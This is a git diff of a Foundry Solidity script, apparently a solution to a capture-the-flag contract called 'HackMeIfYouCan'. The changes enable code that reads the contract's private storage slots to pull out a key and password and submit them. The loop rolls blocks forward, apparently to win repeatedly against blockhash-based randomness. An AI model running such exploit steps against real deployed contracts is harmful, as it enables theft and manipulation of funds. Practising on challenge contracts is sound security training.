@@ -1,8 +1,8 @@
 // SPDX-License-Identifier: UNLICENSED
-pragma solidity 0.8.0;
+pragma solidity ^0.8.0;
 
 import "forge-std/Script.sol";
-import { console } from "forge-std/console.sol"; // Importar correctamente console
+import "forge-std/console.sol";
 
 interface HackMeIfYouCan {
     function getConsecutiveWins(address _addr) external view returns (uint256);
@@ -23,12 +23,13 @@ contract GenerateConsecutiveWins is Script {
         HackMeIfYouCan hackMe = HackMeIfYouCan(contractAddress);
 
         // Load the key and password
-        //bytes32 dataKey = vm.load(contractAddress, bytes32(uint256(16)));
-       // console.log("Loaded key:", bytes16(dataKey));
-       // hackMe.sendKey(bytes16(dataKey));
+        bytes32 dataKey = vm.load(contractAddress, bytes32(uint256(16)));
+        console.log("Loaded key:");
+        console.logBytes16(bytes16(dataKey));
+        hackMe.sendKey(bytes16(dataKey));
 
         bytes32 dataPassword = vm.load(contractAddress, bytes32(uint256(3)));
-        //console.log("Loaded password:", dataPassword); // Usar console.log
+        console.logBytes32(dataPassword);
         hackMe.sendPassword(dataPassword);
 
         uint256 consecutiveWins = hackMe.getConsecutiveWins(myWallet);
@@ -60,8 +61,8 @@ contract GenerateConsecutiveWins is Script {
 
             // Avanzar el bloque
             vm.roll(block.number + 1);
-            // Agregar una espera para asegurar que el blockhash cambia
-            vm.warp(block.timestamp + 30);
+
+            vm.warp(block.timestamp + 15);
         }
 
         // Verificar las victorias consecutivas
